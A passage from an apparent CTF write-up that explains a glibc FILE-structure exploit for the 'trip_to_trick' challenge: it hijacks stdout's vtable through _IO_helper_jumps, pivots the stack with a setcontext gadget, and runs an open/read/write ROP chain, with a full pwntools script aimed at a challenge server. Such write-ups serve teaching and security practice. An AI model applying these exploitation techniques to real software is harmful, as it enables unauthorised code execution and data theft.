+= p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># _chain</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_2_LOCK) <span class="comment"># _lock</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_2) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable</span></span><br></pre></td></tr></table></figure><p>Changing stdout vtable from <code>_IO_file_jumps</code> to <code>_IO_helper_jumps</code> to bypass the <strong>mprotect call</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDOUT</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _flags</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># _chain</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_1_LOCK) <span class="comment"># _lock</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_1) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_HELPER_JUMPS) <span class="comment"># vtable changed to _IO_HELPER_JUMPS</span></span><br></pre></td></tr></table></figure></p><p>Filling the <strong>rest</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += p64(_IO_2_1_STDERR_) <span class="comment"># stderr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># stdout</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># stdin</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(ROP_CHAIN))</span></span><br><span class="line">INPUT2 += <span class="string">'\x00'</span>*(<span class="number">0x1f</span>*<span class="number">8</span>) <span class="comment"># __elf_set___libc_subfreeres</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="Control-Rip-and-stackpivot"><a href="#Control-Rip-and-stackpivot" class="headerlink" title="Control Rip and stackpivot"></a>Control Rip and stackpivot</h3><p>We can control <strong>RIP</strong> by changing <code>_finish</code> from <code>_IO_helper_jumps</code> vtable:<br><a data-fancybox="gallery" href="https://i.imgur.com/NMxH0uq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NMxH0uq.png" alt><br></a><br>And why? because <strong>fclose(stdout)</strong> will be executed in the main_function, and it uses pointers from the vtable.</p><p>Fclose closes a file stream, and releases the file pointer and related buffer, it will first call <code>_IO_unlink_it</code> to delink the specified FILE from the <code>_chain</code> list:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><p>After that will call the system interface to close it:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>Finally, the <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofclose.c#L57" target="_blank" rel="noopener">_IO_FINISH</a> in the vtable is called, which corresponds to the <strong>_IO_file_finish</strong> function:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure></p><p>Now that we control the rip we need a way to stack pivot, so lets first see the value of the registers when we jump to <code>_IO_FINISH</code> pointer by changing it into <strong>0xdeadbeef</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vtable IO_HELPER_JUMPS</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>) _DUMMY1</span><br><span class="line">INPUT2 += p64(<span class="number">0</span>) _DUMMY2</span><br><span class="line">INPUT2 += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># _FINISH</span></span><br></pre></td></tr></table></figure><p>GDB image on pagefault:<br><a data-fancybox="gallery" href="https://i.imgur.com/fuZATDk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/fuZATDk.png" alt><br></a><br>So what is exactly stack pivoting? Stacking pivoting is basically changing the stack pointer to point <strong>somewhere</strong> else, we want this because this time our ropchain won’t be <strong>located</strong> in the <strong>stack</strong> but in libc, if we don’t pivot when executing <strong>ret</strong> instructions we will just <strong>jump</strong> into values <strong>in</strong> the <strong>stack</strong> which is not what we want, there is a need to change the <strong>stack pointer</strong> to point into ropchain <strong>location</strong>.</p><p>We can control the contents of <strong>RDX</strong>, to use it we need to find something like <strong>mov rsp, qword ptr [rdx]; ret</strong>, a gadget like this can be found at <strong>setcontext+0x35</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/4og8ZFu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4og8ZFu.png" alt><br></a><br>So rdx is right at <code>_IO_helper_jumps</code> so we need to put the rop_chain at <code>_IO_helper_jumps + 0xa0</code> because of the instruction <strong>mov rsp, qword ptr [rdx+0xa0];</strong>, by changing the stack pointer into the right libc address we can easily do the jumps:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(SETCONTEXT_SPITVOT) <span class="comment"># _IO_helper_jumps STACKPIVOT SETCONTEXT</span></span><br><span class="line">POPRAX = LIBC + <span class="number">0x0000000000047cf8</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">POPRDI = LIBC + <span class="number">0x0000000000026542</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">POPRDX = LIBC + <span class="number">0x000000000012bda6</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">POPRSI = LIBC + <span class="number">0x0000000000026f9e</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">SYSCALL = LIBC + <span class="number">0x00000000000cf6c5</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">    </span><br><span class="line">FLAG_PATH = _IO_HELPER_JUMPS+<span class="number">0x178</span><span class="comment">#LIBC+0x1baad8#+16*8</span></span><br><span class="line">ROP_ADDR = _IO_HELPER_JUMPS+<span class="number">0xa8</span><span class="comment">#LIBC+0x1baa08</span></span><br><span class="line"></span><br><span class="line">ROP_CHAIN = p64(POPRAX)*<span class="number">2</span><span class="comment">#p64(OPEN)</span></span><br><span class="line">ROP_CHAIN += p64(<span class="number">2</span>) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(<span class="number">0</span>) + p64(SYSCALL) <span class="comment"># OPEN(file=flag_path) syscall == 2</span></span><br><span class="line">ROP_CHAIN += p64(POPRAX) + p64(<span class="number">0</span>) + p64(POPRDI) + p64(<span class="number">3</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0</span></span><br><span class="line">ROP_CHAIN += p64(POPRAX) + p64(<span class="number">1</span>) + p64(POPRDI) + p64(<span class="number">1</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1</span></span><br><span class="line">ROP_CHAIN += <span class="string">"flag\x00"</span></span><br><span class="line"></span><br><span class="line">INPUT2 += <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(ROP_ADDR)+ ROP_CHAIN <span class="comment">#+ '\x00'*(190+7+3) + ROP_CHAIN#+ '\x00'*(0x90-0x88+0x8)+ p64(LIBC)</span></span><br></pre></td></tr></table></figure><p>Again we can’t use <strong>execve</strong> but we can use <strong>open</strong>, <strong>read</strong> and <strong>write</strong> which is enought to solve the challenge. In the end we will be executing this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd= open('flag\x00', 'r') # fd will be equal to 3</span><br><span class="line">read(fd, flag_path, <span class="number">0x49</span>)</span><br><span class="line">write(<span class="number">1</span>, flag_path, <span class="number">0x49</span>)</span><br></pre></td></tr></table></figure><p>The reason why fd will be equal to 3 is because <code>_IO_LIST_ALL</code> contains a linked list of the filestreams, by default <strong>stdin</strong>,<strong>stdout</strong> and <strong>stderr</strong> are already loaded so the next is <strong>3</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0(stdin)-&gt;1(stdout)-&gt;2(stderr)-&gt;3(newfd)</span><br></pre></td></tr></table></figure></p><p>Full python code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"138.68.67.161"</span>, <span class="string">"20006"</span></span><br><span class="line">filename = <span class="string">"./trip_to_trick"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0x000014e2</span>,<span class="number">0x000013ce</span>])</span><br><span class="line">    r.recvuntil(<span class="string">'gift : '</span>)</span><br><span class="line">    SYSTEM = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">    LIBC = SYSTEM-libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    _IO_BUF_BASE = <span class="number">0x38</span></span><br><span class="line">    _IO_BUF_END = <span class="number">0x40</span></span><br><span class="line">    </span><br><span class="line">    _IO_2_1_STDIN_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    _IO_2_1_STDERR_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">    _IO_2_1_STDOUT_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    </span><br><span class="line">    _IO_FILE_JUMPS = LIBC+libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    _IO_HELPER_JUMPS = _IO_2_1_STDIN_+<span class="number">0xf60</span></span><br><span class="line">    </span><br><span class="line">    _IO_STDFILE_0_LOCK = _IO_2_1_STDIN_+<span class="number">0x2b90</span></span><br><span class="line">    _IO_WIDE_DATA_0 = _IO_2_1_STDIN_+<span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">    _IO_STDFILE_1_LOCK = _IO_2_1_STDOUT_+<span class="number">0x1e20</span></span><br><span class="line">    _IO_WIDE_DATA_1 = _IO_2_1_STDOUT_<span class="number">-0xea0</span></span><br><span class="line"></span><br><span class="line">    _IO_STDFILE_2_LOCK = _IO_2_1_STDERR_+<span class="number">0x1ef0</span></span><br><span class="line">    _IO_WIDE_DATA_2 = _IO_2_1_STDERR_<span class="number">-0xf00</span></span><br><span class="line"></span><br><span class="line">    _IO_LIST_ALL = LIBC+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">    SETCONTEXT_SPITVOT = LIBC+libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">0x35</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">    log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># STDIN+131</span></span><br><span class="line">    INPUT2 =<span class="string">'\x0a'</span>+<span class="string">'\x00'</span>*<span class="number">4</span><span class="comment"># p64(_IO_STDFILE_0_LOCK)</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_0_LOCK)</span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_0) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable"""</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)*<span class="number">19</span>*<span class="number">2</span> + p64(LIBC+<span class="number">0x1bb020</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">    INPUT2 += p64(LIBC+libc.symbols[<span class="string">'__memalign_hook'</span>]) <span class="comment"># __memalign_hook</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)</span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*<span class="number">2208</span> <span class="comment"># MAIN_ARENA</span></span><br><span class="line">    INPUT2 += p64(LIBC+<span class="number">0x896b0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># obstack_alloc_failed_handler</span></span><br><span class="line">    INPUT2 += p64(LIBC+<span class="number">0x185072</span>)*<span class="number">2</span> <span class="comment"># tzname</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># program_invocation_short_name</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(LIBC+<span class="number">0x1bd2d8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">-0x1</span>,signed=<span class="keyword">True</span>) <span class="comment"># default_overflow_region</span></span><br><span class="line">    INPUT2 += p64(LIBC)+p64(LIBC) <span class="comment"># __libc_utmp_jump_table</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># _nl_global_locale</span></span><br><span class="line">    OFFSETLIST = [<span class="number">1971584</span>, <span class="number">1972928</span>, <span class="number">1973056</span>, <span class="number">1975232</span>, <span class="number">1972480</span>, <span class="number">1972352</span>, <span class="number">0</span>, <span class="number">1974400</span>, <span class="number">1974496</span>, <span class="number">1974624</span>, <span class="number">1974816</span>, <span class="number">1974944</span>, <span class="number">1975040</span>, <span class="number">1680352</span>, <span class="number">1676512</span>, <span class="number">1678048</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> OFFSETLIST:</span><br><span class="line">        <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">            INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:    </span><br><span class="line">            INPUT2 += p64(LIBC+offset)</span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    INPUT2 += p64(_IO_LIST_ALL+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># IO_LIST_ALL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># STDERR</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0xfbad2887</span>) <span class="comment"># _flags</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    INPUT2 += 